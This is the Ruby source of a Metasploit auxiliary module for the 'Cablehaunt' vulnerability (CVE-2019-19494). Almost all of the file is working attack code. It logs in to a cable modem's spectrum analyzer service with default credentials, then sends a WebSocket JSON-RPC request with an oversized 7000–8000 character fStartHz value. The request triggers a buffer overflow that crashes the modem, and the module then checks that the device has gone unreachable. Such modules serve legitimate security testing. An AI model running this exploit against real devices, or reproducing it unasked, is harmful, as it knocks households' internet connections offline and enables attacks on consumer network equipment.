##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'eventmachine'
require 'faye/websocket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '"Cablehaunt" Cable Modem WebSocket DoS',
        'Description' => %q{
          There exists a buffer overflow vulnerability in certain
          Cable Modem Spectrum Analyzer interfaces.  This overflow
          is exploitable, but since an exploit would differ between
          every make, model, and firmware version (which also
          differs from ISP to ISP), this module simply causes a
          Denial of Service to test if the vulnerability is present.
        },
        'Author' => [
          'Alexander Dalsgaard Krog (Lyrebirds)', # Original research, discovery, and PoC
          'Jens Hegner Stærmose (Lyrebirds)', # Original research, discovery, and PoC
          'Kasper Kohsel Terndrup (Lyrebirds)', # Original research, discovery, and PoC
          'Simon Vandel Sillesen (Independent)', # Original research, discovery, and PoC
          'Nicholas Starke' # msf module
        ],
        'References' => [
          ['CVE', '2019-19494'],
          ['EDB', '47936'],
          ['URL', 'https://cablehaunt.com/'],
          ['URL', 'https://github.com/Lyrebirds/sagemcom-fast-3890-exploit']
        ],
        'DisclosureDate' => '2020-01-07',
        'License' => MSF_LICENSE
      )
    )

    register_options(
      [
        Opt::RHOST('192.168.100.1'),
        Opt::RPORT(8080),
        OptString.new('WS_USERNAME', [true, 'WebSocket connection basic auth username', 'admin']),
        OptString.new('WS_PASSWORD', [true, 'WebSocket connection basic auth password', 'password']),
        OptInt.new('TIMEOUT', [true, 'Time to wait for response', 15])
      ]
    )

    deregister_options('Proxies')
    deregister_options('VHOST')
    deregister_options('SSL')
  end

  def run
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => '/',
      'authorization' => basic_auth(datastore['WS_USERNAME'], datastore['WS_PASSWORD'])
    })

    fail_with(Failure::Unreachable, 'Cannot Connect to Cable Modem Spectrum Analyzer Web Service') if res.nil?
    fail_with(Failure::Unknown, 'Credentials were incorrect') if res.code != 200

    @succeeded = false
    EM.run do
      print_status("Attempting Connection to #{datastore['RHOST']}")

      driver = Faye::WebSocket::Client.new("ws://#{datastore['RHOST']}:#{datastore['RPORT']}/Frontend", ['rpc-frontend'])

      driver.on :open do
        print_status('Opened connection')

        EM::Timer.new(1) do
          print_status('Sending payload')
          payload = Rex::Text.rand_text_alphanumeric(7000..8000)
          driver.send({
            jsonrpc: '2.0',
            method: 'Frontend::GetFrontendSpectrumData',
            params: {
              coreID: 0,
              fStartHz: payload,
              fStopHz: 1000000000,
              fftSize: 1024,
              gain: 1
            },
            id: '0'
          }.to_json)
        rescue StandardError
          fail_with(Failure::Unreachable, 'Could not establish websocket connection')
        end
      end

      EM::Timer.new(10) do
        print_status('Checking Modem Status')
        begin
          res = send_request_cgi({
            'method' => 'GET',
            'uri' => '/'
          })

          if res.nil?
            @succeeded = true
            print_status('Cable Modem unreachable')
          else
            fail_with(Failure::Unknown, 'Host still reachable')
          end
        rescue StandardError
          @succeeded = true
          print_status('Cable Modem unreachable')
        end
      end

      EM::Timer.new(datastore['TIMEOUT']) do
        EventMachine.stop
        if @succeeded
          print_good('Exploit delivered and cable modem unreachable.')
        else
          fail_with(Failure::Unknown, 'Unknown failure occurred')
        end
      end
    end
  end
end
